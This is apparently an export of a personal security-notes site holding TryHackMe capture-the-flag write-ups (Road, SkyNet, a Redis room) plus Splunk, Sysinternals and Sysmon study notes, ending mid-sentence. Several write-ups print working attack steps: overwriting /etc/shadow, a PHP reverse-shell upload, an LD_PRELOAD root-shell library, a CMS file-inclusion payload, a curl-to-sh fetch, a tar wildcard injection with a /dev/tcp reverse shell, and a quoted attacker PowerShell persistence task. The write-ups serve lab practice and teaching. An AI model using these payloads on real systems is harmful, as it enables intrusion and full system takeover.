you could just submit the flags \u0026 move on. But how could I do that without a root shell? ü´†\n\nSo we have write access through `xxd`, but what can we do with it? It [turns out](https://medium.com/@gaby_perso/privileges-escalation-with-suid-992c279c9bc3) you can just modify the original `/etc/shadow` file with our own \u0026 set the root password. \nIf you look in the [shadow documentation](https://linux.die.net/man/5/shadow) it specifies that the 2nd parameter contains the encrypted password of the user by the use of crypt tools\n![[write-ups/images/Pasted image 20220808144127.png]]\n\nAnd we can see that being applied with `vianka`, so why not use `xxd` to place our own password there for root ? First, we need to generate the hash. We know that the salt should be `$6$2p` from `vianka`, so a little python magic is required:\n![[write-ups/images/Pasted image 20220808144338.png]]\nOnce we have the hash just replace the `!` char with it, upload the file to the remote host *(`python -m http.server`)*, change the original one using `LFILE=/etc/shadow \u0026\u0026 cat my_shadow | xxd | xxd -r - \"$LFILE\"` \u0026 `su root` \n![[write-ups/images/Pasted image 20220808125409.png]]\n\n\n## Refs\n- https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots\n- https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html\n- https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell\n- https://www.npmjs.com/package/redis-dump\n- https://lzone.de/cheat-sheet/Redis\n- https://github.com/n0b0dyCN/redis-rogue-server\n- https://gtfobins.github.io/gtfobins/xxd/\n- https://www.commandlinux.com/man-page/man8/unshadow.8.html\n- https://medium.com/@gaby_perso/privileges-escalation-with-suid-992c279c9bc3\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/road":{"title":"Road","content":"\n## Enumeration\n![[write-ups/images/Pasted image 20220819191421.png]]\n\nnmap gives us just 2 ports open: `80` and `22`\n\n### Web Server\n![[write-ups/images/Pasted image 20220819191517.png]]\nI let `gobuster` run in the background while browsing the website with burp open.\n![[write-ups/images/Pasted image 20220819191726.png]]\nFound a login page @ `/v2/admin/login.html`, which also lets us to register. So I made an account \u0026 logged in afterwards\n![[write-ups/images/Pasted image 20220819191859.png]]\nCouldn't inject anything by the search functionality\n![[write-ups/images/Pasted image 20220819191937.png]]\n\n## Bypass restriction on password reset \u0026 get admin\nAt this point I just clicked everything on the dashboard to see what kind of functionality does it provide \u0026 I found that I could reset my password @ `/v2/ResetUser.php`\n![[write-ups/images/Pasted image 20220819192123.png]]\n\nAs you can see, it seems that we can't change the username field from the browser... But what about Burp?\n\n![[write-ups/images/Pasted image 20220819192242.png]]\n\nAnd it just passes through ü•≥ . Ok, we can reset the password of any user \u0026 posibly take over their account, but how do we know the users available? We need some kind of user enumeration or leakeage, so i started looking around. If we go on our `profile.php` we see that we can change our user profile only if we're admin \u0026 we're conveniently given an email address. Nothing could go wrong right?\n\n![[write-ups/images/Pasted image 20220819192623.png]]\n\nSo repeat the process from before, log out \u0026 sign in as admin with your new password üòÑ\n\n## Webshell upload\nWe now have the upload functionality available, and we all know it's kind of bad if not properly configured. So I just grabbed a [revshell](https://www.revshells.com/) \u0026 uploaded it.\n![[write-ups/images/Pasted image 20220819193211.png]]\n\nIt seems that it went through, but where do we access it. I got stuck here for a bit, trying to brute-force my way in finding a path. After a while, I decided to take a look at the good old html source \u0026 found this:\n\n![[write-ups/images/Pasted image 20220819193340.png]]\n\nGuess, I've wasted some valuable time there üòÖ . But now that we know the path just start a listener \u0026 go to `http://10.10.10.29/v2/profileimages/revsh.php`\n![[write-ups/images/Pasted image 20220819193530.png]]\n\n## Escalating to user\nOnce on the box I ran the [enumerate module](https://pwncat.readthedocs.io/en/latest/enum.html) from pwncat \u0026 noticed that both mysql \u0026 mongodb are running. Trying to connect to mysql gave me nothing, thus I tried `mongo` as well. Here I found a `backup` db where it stored the password for the `webdeveloper` user\n![[write-ups/images/Pasted image 20220819194027.png]]\n\nJust connect through `ssh` \u0026 we got user\n![[write-ups/images/Pasted image 20220819194149.png]]\n\n## Getting root\nRunning pwncat `enumerate` shows us that we can execute `/usr/bin/sky_backup_utility` as root without a password\n![[write-ups/images/Pasted image 20220819194334.png]]\nSo let's try it\n![[write-ups/images/Pasted image 20220819194420.png]]\n\nSeems that it just makes a backup of the web server. We see that it's an ELF executable \u0026 that it sets the environment for `LD_PRELOAD`\n![[write-ups/images/Pasted image 20220819194757.png]]\n\nSince `LD_PRELOAD` is enabled, we can add a path to our own shared library that the loader will use before any other shared library. So we can create a simple `shell.c` in `/tmp`:\n```c\n#include \u003cstdio.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003cstdlib.h\u003e\n\nvoid _init() {\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0);\n  setuid(0);\n  system(\"/bin/bash\");\n}\n```\n\nRetrieve it, compile as shared library, set `LD_PRELOAD` to it \u0026 execute.\n![[write-ups/images/Pasted image 20220819195136.png]]\n\n## Refs\n- [LD_PRELOAD \u0026 LD_LIB_PATH privesc haktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/skynet":{"title":"SkyNet","content":"\n## Enumeration\n![[write-ups/images/Pasted image 20220822143023.png]]\n- for smb I ran `enum4linux` in the background\n\t- ![[write-ups/images/Pasted image 20220822145222.png]]\n\t- tried anonymous login \u0026 found this\n\t- ![[write-ups/images/Pasted image 20220822145314.png]]\n\t- ![[write-ups/images/Pasted image 20220822145346.png]]\n\t- so we have a list of potential passwords for the `mikedyson` user\n- goin on the web server we have this search bar\n\t- ![[write-ups/images/Pasted image 20220822145457.png]]\n\t- however it doesn't seem to do anything so I ran `gobuster`\n\t- ![[write-ups/images/Pasted image 20220822145603.png]]\n\t- most of them gave me [403 Frobidden](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403), but [squirrelmail](https://www.squirrelmail.org/) was available which is *\"a standards-based webmail package written in PHP\"*. As we've seen in the nmap scan the target is running a mail server \u0026 this is a front-end to that\n\t- ![[write-ups/images/Pasted image 20220822145944.png]]\n\n## Getting user \n\n### Password Leak\nSo remembering my list from smb, I tried logging in as `milesdyson` with the first one \u0026 it just worked \n![[write-ups/images/Pasted image 20220822150038.png]]\n\nGoing through the mails we see that we might have a SMB password leak\n![[write-ups/images/Pasted image 20220822150148.png]]\nAnd indeed we do, now we can have a look at the `milesdyson` shared folder.\n![[write-ups/images/Pasted image 20220822152030.png]]\nBooks on machine learning and a bunch of notes, while interesting not so useful for us. However, I still downloaded everything: `smbget -R smb://10.10.94.44/milesdyson -U milesdyson`. Going through the files, one popped up:\n![[write-ups/images/Pasted image 20220822153006.png]]\nHmm, to test if it's actually running a CMS on that endpoint I went to the browser\n![[write-ups/images/Pasted image 20220822153049.png]]\n\n### Local File Inclusion to RCE\nBesides getting more insight in who Miles Dyson is we can't to much. Going back to gobuster revealed `/administrator` which runs [cuppa CMS](https://www.cuppacms.com/)\n![[write-ups/images/Pasted image 20220822153616.png]]\nTried to login as `milesdyson` hoping to have some kind of credential reuse \u0026 also the defaults, but nothing. At this point I went to my old friend google \u0026 found a [file inclusion](https://www.exploit-db.com/exploits/25971). To try it I went to the following URL: `http://10.10.94.44/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`\n![[write-ups/images/Pasted image 20220822153840.png]]\nAs the exploit note says, we can access `Configuration.php` \u0026 leak the password by supplying this payload:`urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. It will get us the contents of the configuration file in base64, so decode it and voila:\n![[write-ups/images/Pasted image 20220822154222.png]]\nOr we can do more nasty stuff such as executing php code \u0026 getting a [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)\n![[write-ups/images/Pasted image 20220822160118.png]]\n\n## Cron with wildcard injection privesc\nOnce I got onto the system I ran the [pwncat's enumeration module](https://pwncat.readthedocs.io/en/latest/enum.html) \u0026 linpeas: `curl http://10.18.12.227:8000/linepas.sh | sh` . While taking my time going through anything peculiar I noticed a `backup.sh` in `milesdyson` home dir which is owned by `root`\n![[write-ups/images/Pasted image 20220822161050.png]]\n\nAs it turns out, the backup acts a cron job that runs [once every minute](https://crontab.guru/#*/1_*_*_*_*)\n![[write-ups/images/Pasted image 20220822160816.png]]\n\nTaking a look again at the `backup.sh` script I noticed it ran `tar` with a general wildcard `*` and not `/path/*` or `./*`. Thus we can do unexpected things, such as privesc, through [[Wildcard Injection]]. If confused about the topic take a look at [this paper](https://www.exploit-db.com/papers/33930) going in depth. The basic idea is that we can inject arbitrary arguments to shell commands by creating specially crafted filenames.\n\nIn our case we have to look @ [tar](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar) \u0026 identify args that can be used for poisoning: `--checkpoint` and `--checkpoint-action` are our cadidates:\n![[write-ups/images/Pasted image 20220822170616.png]]\n\nGoing forward we need to create 2 files: `--checkpoint=1` and `--checkpoint-action=exec=sh privesc.sh`, placing them in `/var/www/html` *(since that's where `tar` gets executed)*. Doing that, tar will get confused \u0026 treat our files as arguments that instruct it to execute our `privesc.sh` script as `root`.\n```bash\necho 'bash -i \u003e\u0026 /dev/tcp/10.18.12.227/1337 0\u003e\u00261' \u003e privesc.sh \u0026\u0026 touch \"/var/www/html/--checkpoint=1\" \"/var/www/html/--checkpoint-action=exec=sh privesc.sh\"\n```\n\nNow we just need to wait 1 minute to get our root shell ‚òï\n![[write-ups/images/Pasted image 20220822165638.png]]\n\n\n## See Also\n- [[Wildcard Injection]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/splunk-101":{"title":"Splunk101","content":"\n- Splunk is not only used for security; it's used for data analysis, DevOps, etc\n- [Installing Splunk](https://docs.splunk.com/Documentation/Splunk/8.1.2/SearchTutorial/InstallSplunk)\n\n## [What is a SIEM ?](https://www.varonis.com/blog/what-is-siem/)\n**Security Information and Event Management** is a software solution that provides a central location to collect log data from multiple sources within your environment. This data is aggregated and normalized, which can then be queried by an analyst.\n\n3 critical capabilities for a SIEM:\n1. Thread Detection\n2. Investigation\n3. Time to respond\n\nOther features might include:\n- Basic security monitoring\n- Advanced threat detection\n- Forensics \u0026 incident response\n- Log collection\n- Normalization\n- Notifications and alerts\n- Security incident detection\n- Threat response workflow\n\n## [Sigma Rules](https://github.com/SigmaHQ/sigma)\n\u003e \"_Sigma is a generic and open signature format that allows you to describe relevant log events in a straightforward manner. The rule format is very flexible, easy to write and applicable to any type of log file. The main purpose of this project is to provide a structured form in which researchers or analysts can describe their once developed detection methods and make them shareable with others_\"\n\nSome supported target SIEMs:\n\n- [Splunk](https://www.splunk.com/)\n- [Microsoft Defender Advanced Threat Protection](https://www.microsoft.com/en-us/microsoft-365/windows/microsoft-defender-atp)\n- [Azure Sentinel](https://azure.microsoft.com/en-us/services/azure-sentinel/)\n- [ArcSight](https://software.microfocus.com/en-us/products/siem-security-information-event-management/overview)\n- [QRadar](https://www.ibm.com/products/qradar-siem)\n\nSome projects/products that use Sigma:\n- [MISP](https://www.misp-project.org/index.html)\n- [THOR](https://www.nextron-systems.com/thor/)\n- [Joe Sandbox](https://www.joesecurity.org/)\n\n- Usage: `./sigmac -t splunk -c tools/config/generic/sysmon.yml ./rules/windows/process_creation/win_susp_whoami.yml`\n\t- or web tool by [Florian Roth](https://socprime.com/leadership/florian-roth/): ¬†[Uncoder.io](https://uncoder.io/)\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]\n- [[write-ups/thm/splunk-2]]","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/splunk-2":{"title":"Splunk 2","content":"\n**BOTSv2 Github**:¬†[https://github.com/splunk/botsv2](https://github.com/splunk/botsv2)\n\nIn this exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly (_a beer company_) to assist them with their recent issues.\n\n## 100\n- find amber's ip addr: `index=\"botsv2\" sourcetype=\"pan:traffic\" amber`\n\t- ![[write-ups/images/Pasted image 20220615160908.png]]\n- filter HTTP traffic based on the found ip: `index=\"botsv2\"¬†10.0.2.101¬†sourcetype=\"stream:HTTP\"`\n- filter out the noise by removing the duplicatess *(`dedup`)* \u0026 format in a `table`: `index=\"botsv2\" sourcetype=\"stream:http\" 10.0.2.101 | dedup site | table site`\n\t- ![[write-ups/images/Pasted image 20220615161055.png]]\n- we know Amber works in the *beer* industry: `index=\"botsv2\" sourcetype=\"stream:http\" 10.0.2.101 *beer* | dedup site | table site`\n\t- ![[write-ups/images/Pasted image 20220615161259.png]]\n- now that we have the competitor website we can search for all traffic from Amber to it \u0026 look for an image: `index=\"botsv2\" sourcetype=\"stream:http\" 10.0.2.101 berkbeer.com | table uri_path`\n\t- ![[write-ups/images/Pasted image 20220615161602.png]]\n- we know that Amber found the CEO \u0026 sent him an email\n\t- firstly we need the Amber's email: `index=\"botsv2\" sourcetype=\"stream:smtp\" amber`\n\t\t- ![[write-ups/images/Pasted image 20220615161854.png]]\n\t- now we can search for any communication w the competitor: `index=\"botsv2\" sourcetype=\"stream:smtp\" aturing@froth.ly berkbeer.com`\n\t\t- ![[write-ups/images/Pasted image 20220615162236.png]]\n\t\t- ![[write-ups/images/Pasted image 20220615162323.png]]\n\t\t- ![[write-ups/images/Pasted image 20220615162650.png]]\n- so Amber contacted the CEO *(Martin Berk)* \u0026 suggested to discuss about a possible future collaboration as she was feeling insecure about her current job -\u003e Martin Berk responded by telling her he's open to discuss, but he'll also like to have Bernhard on the call. Furthermore, Bernard asked Amber if she had a personal email to reach her. Which she responded with in a base64 encoded email in which she gave her personal email + an attached document\n\t- ![[write-ups/images/Pasted image 20220615163341.png]]\n\t- ![[write-ups/images/Pasted image 20220615163402.png]]\n\n\n## 200\n- get the tor version Amber was running: `index=\"botsv2\" amber tor | reverse`\n\t- ![[write-ups/images/Pasted image 20220615164406.png]]\n- determine the¬†public¬†IP address for brewertalk.com and the IP address performing a web vulnerability scan against it\n- find out the public IPv4 addr of the server running `www.bewertalk.com`: `index=\"botsv2\" brewertalk.com | dedup src_ip | table src_ip`\n\t- ![[write-ups/images/Pasted image 20220615165221.png]]\n\t- ![[write-ups/images/Pasted image 20220615165137.png]]\n- the `45.77.65.211` iss hitting the hardest so we can assume that is the originator of the web vuln scan\n- `index=\"botsv2\" src_ip=\"45.77.65.211\"` to see all traffic \u0026 filter by `uri_path` in **Interesting Fields**\n\t- ![[write-ups/images/Pasted image 20220615165808.png]]\n- filtering by the newly identified attacked `uri_path` we can see what SQL function is being abused: `index=\"botsv2\" src_ip=\"45.77.65.211\" uri_path=\"/member.php\"`\n\t- ![[write-ups/images/Pasted image 20220615170028.png]]\n- identify the cookie value that was transmitted as part of an XSS attack. The user has been identified as Kevin. \n\t- `index=\"botsv2\" kevin cookie` =\u003e `mybb[lastvisit]=1502408189`\n\t\t- ![[write-ups/images/Pasted image 20220615170916.png]]\n\t- the attacker used the stolen CSRF token to perform a [homograph attack](https://blog.malwarebytes.com/101/2017/10/out-of-character-homograph-attacks-explained/)\n\t- quering by it: `index=\"botsv2\" 1bc3eab741900ab25c98eee86bf20feb`\n\t\t- ![[write-ups/images/Pasted image 20220615171544.png]]\n\n## 300\n- Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. What is the name of this file after it was encrypted?\n\t- `index=\"botsv2\" mallory` would yield the single MacBook host: `maclory-air13`\n\t- since we're looking for a PowerPoint presentation we can add common file extenstions: `index=\"botsv2\" host=\"maclory-air13\"  (*.ppt OR *.pptx)`\n\t- ![[write-ups/images/Pasted image 20220615173509.png]]\n- There is a Games of Thrones movie file that was encrypted as well. What season and episode is it?\n\t- `index=\"botsv2\" host=\"maclory-air13\" sourcetype=\"ps\" *.crypt got` OR `index=\"botsv2\"  got (*.crypt)`\n\t- ![[write-ups/images/Pasted image 20220615180844.png]]\n- Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.\n\t- search for usb activity for kutekitten: `index=\"botsv2\" kutekitten usb`\n\t- ![[write-ups/images/Pasted image 20220616140829.png]]\n\t- got the `vendor id` \u0026 with a simple google search we find that `Alcor Micro Corp.` is the answer\n- What programming language is at least part of the malware from the question above written in?\n\t- staarted looking for files inside the `mkreusen` user: `index=\"botsv2\" kutekitten \"\\\\/Users\\\\/mkraeusen\"`\n\t- found interesting field: `target_path` \u0026 filtered by it\n\t- ![[write-ups/images/Pasted image 20220616174446.png]]\n\t- got the hash of the file \u0026 uploaded to [VirusTotal](https://www.virustotal.com/gui/file/befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271/detection)\n\t\t- ![[write-ups/images/Pasted image 20220616174542.png]]\n\t- on the Details page we see that it's written in `perl` \u0026 it was first seen in the wild in `2017-01-17 19:09:06 UTC`\n\t- the malware is a [Mac backdoor used to spy on users](https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/) which was active for 10 years upon detection\n- The malware infecting kutekitten uses dynamic¬†DNS¬†destinations to communicate with two C\u0026C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?\n\t- also from [VirusTotal](https://www.virustotal.com/gui/file/befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271/relations) report we know the C\u0026C DNS desstinations\n\t- ![[write-ups/images/Pasted image 20220616181540.png]]\n\n\n## 400\n- A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?\n\t- so we know the extension `.zip` \u0026 that the malware is sspreaad through spear phising, let's start there: `index=\"botsv2\" sourcetype=\"stream:smtp\" *.zip`\n\t- we get back 6 events \u0026 by taking a quick look we can see that the attackers use the `invoice.zip` file attachment to infect the user\n- What is the password to open the zip file?\n\t- taking a look @ the initial email\n\t- ![[write-ups/images/Pasted image 20220616182308.png]]\n\t- or: `index=\"botsv2\" sourcetype=\"stream:smtp\" *.zip \"attach_filename{}\"=\"invoice.zip\" \"password\"`\n- The Taedonggang APT group encrypts most of their traffic with SSL. What is the \"SSL Issuer\" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.\n\t- we can get find the `invoice.zip` file encoded in base64 in one of the events\n\t- download it \u0026 decode: `cat invoice_b64 | base64 -d \u003e invoice.zip`\n\t- unzip the file to get the document: `unzip invoice.zip`\n\t- ![[write-ups/images/Pasted image 20220616185502.png]]\n\t- got the SHA256 hash: `sha256sum invoice.doc` \u003e `d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1`\n\t- uploading it to [VirusTotal](https://www.virustotal.com/gui/file/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/details) \u0026 [HybridAnalysis](https://www.hybrid-analysis.com/sample/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1) gets us a list of C\u0026C ips\n\t- ![[write-ups/images/Pasted image 20220616185624.png]]\n\t- now we can query any tcp traffic on that ip: `index=\"botsv2\" sourcetype=\"stream:tcp\" 45.77.65.211` to find the SSL issuer\n\t- ![[write-ups/images/Pasted image 20220616185807.png]]\n- What unusual file *(for an American company)* does `winsys32.dll` cause to be downloaded into the Frothly environment?\n\t- `index=\"botsv2\" winsys32.dll`\n\t- ![[write-ups/images/Pasted image 20220616185959.png]]\n\t- `index=\"botsv2\" sourcetype=\"stream:ftp\"`\n\t- ![[write-ups/images/Pasted image 20220616190959.png]]\n\t- since the only method for downloading something is `RETR` I filtered by it: `index=\"botsv2\" sourcetype=\"stream:ftp\" method=RETR`\n\t- ![[write-ups/images/Pasted image 20220616191046.png]]\n\t- the only susspicious file is `·ÑÇ·Ö°·ÑÇ·Ö≥·Ü´_·ÑÉ·Ö¶·Ñã·Öµ·Ñá·Öµ·ÑÉ·Ö≥·ÑÖ·Ö≥·ÜØ_·Ñâ·Ö°·ÑÖ·Ö°·Üº·Ñí·Ö°·Ü´·ÑÉ·Ö°.hwp`\n- What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith\n\t- looking @ the metadata of the `invoice.doc` we find the Author\n\t- ![[write-ups/images/Pasted image 20220616192213.png]]\n- Within the document, what kind of points is mentioned if you found the text?\n\t- `CyberEastEggs` as we saw in a prev image\n- To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their¬†C2¬†server. What single webpage is most contacted by these Scheduled Tasks? \n\t- usually adverssariess use `schtasks.exe` to lunch scheduled tasks: `index=\"botsv2\" schtasks.exe`\n\t- to narrow down our results I only looked @ sysmon logs: `index=\"botsv2\" schtasks.exe sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\"` \u0026 focused on the day of the incident: `August 24 2017` =\u003e only 5 events\n\t- from there we get the command that sets up the scheduled task\n\t\t```powershell\n\t\tC:\\Windows\\system32\\schtasks.exe\" /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\\\n\t\t```\n\t- we can see that it uses the `HKLM:\\Software\\Microsoft\\Network` registry key to make a web request so I filtered by it: `index=\"botsv2\" source=\"winregistry\"  \"Software\\\\Microsoft\\\\Network\"` =\u003e getting the base64 encoded value\n\t- ![[write-ups/images/Pasted image 20220616195011.png]]\n\n\n---\n\n## References\n- [room](https://tryhackme.com/room/splunk2gcd5)\n- [Hybrid Analysis](https://www.hybrid-analysis.com/)\n- [Any.run](https://app.any.run/)\n- [Diamon Model for Intrustion Analysis](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf)\n\n## See Also\n- [[write-ups/thm/splunk-101]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/sysinternals":{"title":"SysInternals","content":"\nThe Sysinternals tools is a compilation of over 70+ Windows-based tools which fall under the following categories:\n- **File \u0026 Disk Utilities**\n- **Networking Utilities**\n- **Process Utilities**\n- **Security Utilities**\n- **System Information**\n- **Miscellaneous**\n\nThese tools are popular amongst IT professionals who manage Windows systems. Even red teamers \u0026 adversaries usse them\n\n- **Installation**\n\t- You can download them [from here](https://docs.microsoft.com/en-us/sysinternals/downloads/) or with powershell module: `Download-SysInternalsTools C:\\Tools\\Sysint`\n\t- Add the folder path to the environment vars *(accesible though `System Properties`: `sysdm.cpl`)*\n\n- **Sysinternals Live**: run the tools from the [web](https://live.sysinternals.com/) \n\t- enables you to execute Sysinternals tools directly from the Web without hunting for and manually downloading them\n\t- enter a tool's path into Windows Explorer or a cmd prompt as: `live.sysinternals.com/\u003ctoolname\u003e` or `\\\\live.sysinternals.com\\tools\\\u003ctoolname\u003e`\n\t- enable the [WebDAV](https://docs.microsoft.com/en-us/iis/configuration/system.webserver/webdav/) client which must be installed \u0026 running\n\t\t- ![[write-ups/images/Pasted image 20220611153319.png]]\n\t\t- this protocol is what allows a local machine to access a remote machine running a WebDAV share and perform actions in it\n\t\t- ![[write-ups/images/Pasted image 20220611153722.png]]\n\t\t- install the `WebDAV Redirector` *(via `Server Manager` or powershell)*\n\t\t\t- `Install-WindowsFeature WebDAV-Redirector ‚ÄìRestart` *(needs reboot)*\n\t\t\t- verify installation:  `Get-WindowsFeature WebDAV-Redirector | Format-Table ‚ÄìAutosize`\n\t- **Network Discovery** needs to be enabled as well *(through `Network \u0026 Sharing Center`)*\n\t\t- `control.exe /name Microsoft.NetworkAndSharingCeenter`\n\t\t- `Change Advanced Sharing Settings \u003e Turn on Network Discovery`\n\t- 2 ways to run the tools\n\t\t- from the cmd-line: `\\\\live.sysinternals.com\\tools\\procmon.exe`\n\t\t- from a mapped drive: `net use * \\\\live.sysinternals.com\\tools\\` *(the `*` will auto-assign a drive letter)*\n\t\t\t- website is not browsable within the local machine @ `Y:`\n\n- **Real-world scenario**: As a security engineer, I had to work with vendors to troubleshoot why an agent wasn't responding on an endpoint‚Äîthe tools used were¬†**ProcExp**,¬†**ProcMon**, and¬†**ProcDump**.\n\t-  [procexp](../../sheets/procexp.md) = to inspect the agent process, its properties, and associated threads and handles.\n\t-  [procmon](../../sheets/procmon.md) = to investigate if there were any indicators on why the agent was not operating as it should.\n\t-  [procdump](../../sheets/procdump.md) = to create a dump of the agent process to send to the vendor for further analysis.\n\n## [File \u0026 Disk Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/file-and-disk-utilities)\n\n- [Sigcheck](../../sheets/Sigcheck.md)\n- [streams](../../sheets/streams.md)\n- [sdelete](../../sheets/sdelete.md)\n\n### Answer\n- ![[write-ups/images/Pasted image 20220611161119.png]]\n- There is a txt file on the desktop named file.txt. Using one of the three discussed tools in this task, what is the text within the ADS?\n\t- I am hiding in the stream.\n\n## [Network Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/networking-utilities)\n\"**TCPView**¬†is a Windows program that will show you detailed listings of all¬†TCP¬†and UDP endpoints on your system, including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon, a command-line version with the same functionality.\"\n\n- Windows has a built-in utlity that providess the same functionality: `Resource Monitor` - `resmon`\n\n### Answer\n- Using WHOIS tools, what is the ISP/Organization for the remote address in the screenshots above?\n\t- `whois 52.154.170.73` =\u003e `Microsoft Corporation`\n\n\n## [Process Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/process-utilities)\n\n- [autoruns](../../sheets/autoruns.md)\n- [procdump](../../sheets/procdump.md)\n- [procexp](../../sheets/procexp.md)\n- [procmon](../../sheets/procmon.md)\n- [psexec](../../sheets/psexec.md)\n\n### Answers\n![[write-ups/images/Pasted image 20220611165145.png]]\n\n- What iss the updated value?: `c:\\tools\\sysint\\procexp.exe`\n- What entry was updated?: `taskmgr.exe`\n\n## [Security Utilies](https://docs.microsoft.com/en-us/sysinternals/downloads/security-utilities)\n\n- [sysmon](write-ups/thm/sysmon.md)\n\n## [Miscellaneous](https://docs.microsoft.com/en-us/sysinternals/downloads/misc-utilities)\n- [BgInfo](https://docs.microsoft.com/en-us/sysinternals/downloads/bginfo): displays relevant information about a Windows computer on the desktop's background, such as the computer name, IP address, service pack version, and more\n\t- handy utility if you manage multiple machines\n\t- typically utilized on servers\n\t- ![[write-ups/images/Pasted image 20220611170911.png]]\n- [RegJump](https://docs.microsoft.com/en-us/sysinternals/downloads/regjump): takes a registry path and makes Regedit open to that path. It accepts root keys in standard *(e.g. `HKEY_LOCAL_MACHINE`)* and abbreviated form *(e.g. `HKLM`)*\n\t- query the Windows Registry without using the Registry Editor *(cmd: `reg query` \u0026 powershell: `Get-Item`, `Get-ItemProperty`)*\n\t- `regjump HKLM\\System\\CurrentControlSet\\Services\\WebClient -accepteula`: automatically open the editor directly at the path, so one doesn't need to navigate it manually\n- [Strings](https://docs.microsoft.com/en-us/sysinternals/downloads/strings): cans the file you pass it for UNICODE (or ASCII) strings of a default length of 3 or more UNICODE (or ASCII) characters\n\t- ![[write-ups/images/Pasted image 20220611171259.png]]\n\n### Answer\n![[write-ups/images/Pasted image 20220611171830.png]]\n\n- Run the Strings tool on ZoomIt.exe. What is the full path to the .pdb file?\n\t- `C:\\agent\\_work\\112\\ss\\Win32\\Release\\ZoomIt.pdb`\n\n\n---\n\n## References\n- [sysinternals docs](https://docs.microsoft.com/en-us/sysinternals/)\n- [talosintelligence](https://talosintelligence.com/)\n- Mark's Blog -¬†[https://docs.microsoft.com/en-us/archive/blogs/markrussinovich/](https://docs.microsoft.com/en-us/archive/blogs/markrussinovich/)[](https://docs.microsoft.com/en-us/archive/blogs/markrussinovich/)\n- Windows Blog Archive -¬†[https://techcommunity.microsoft.com/t5/windows-blog-archive/bg-p/Windows-Blog-Archive/label-name/Mark Russinovich](https://techcommunity.microsoft.com/t5/windows-blog-archive/bg-p/Windows-Blog-Archive/label-name/Mark Russinovich)\n- License to Kill: Malware Hunting with Sysinternals Tools -¬†[https://www.youtube.com/watch?v=A_TPZxuTzBU](https://www.youtube.com/watch?v=A_TPZxuTzBU)  \n- Malware Hunting with Mark Russinovich and the Sysinternals Tools -¬†[https://www.youtube.com/watch?v=vW8eAqZyWeo](https://www.youtube.com/watch?v=vW8eAqZyWeo)\n\n## See Also\n- [[write-ups/thm/core-windows-processes]]\n- [[write-ups/THM]]\n- [[write-ups/thm/sysmon]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/sysmon":{"title":"SysMon","content":"\n## Overview\n- most commonly used in conjuction w a security information \u0026 management system *(SIEM)*\n- events are stored in `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`\n- installation:\n\t- powersshell: `Download-SysInternalsTools C:\\Sysinternals`\n\t- Sysmon binary from the¬†[Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)¬†website\n\t- download the¬†[Microsoft Sysinternal Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)\n\t- staring it: `Sysmon.exe -accepteula -i sysmonconfig-export.xml`\n- [config example](https://github.com/SwiftOnSecurity/sysmon-config)\n\t- a majority of rules in sysmon-config will exclude events rather than include events\n- Event ID 1: Process Creation\n\t- will look for any processes that have been 